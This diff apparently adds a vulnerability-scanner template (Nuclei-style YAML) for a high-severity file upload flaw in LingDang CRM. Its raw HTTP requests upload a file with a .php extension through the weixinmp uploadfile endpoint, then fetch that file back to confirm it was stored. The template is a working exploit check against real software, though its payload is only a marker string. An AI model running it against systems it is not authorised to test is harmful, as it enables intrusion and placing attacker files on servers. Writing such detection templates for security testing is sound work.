@@ -1,0 +1,56 @@
+id: lingdangCRM-uploadfile-upload
+
+info:
+  name: 灵当CRM系统接口uploadfile文件上传漏洞
+  author: lingdangCRM-uploadfile-upload
+  severity: high
+  tags: lingdangCRM-uploadfile-upload
+
+http:
+  - raw:
+      - |
+        POST /crm/weixinmp/index.php?userid=123&module=Upload&usid=1&action=uploadfile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        file_info={"name":"1et3d55d.php"}&test13estests
+
+      - |+
+        GET /crm/{{paths}}{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    extractors:
+      - type: regex
+        part: body
+        name: path
+        regex:
+          - '"filename":"([^"]*\.php)"'
+        internal: true
+        group: 1
+
+      - type: regex
+        part: body
+        name: paths
+        regex:
+          - '"filepath":"([^"]*)"'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - 'test13estests'
+          - 'file_info'
+        condition: and
+    matchers-condition: and
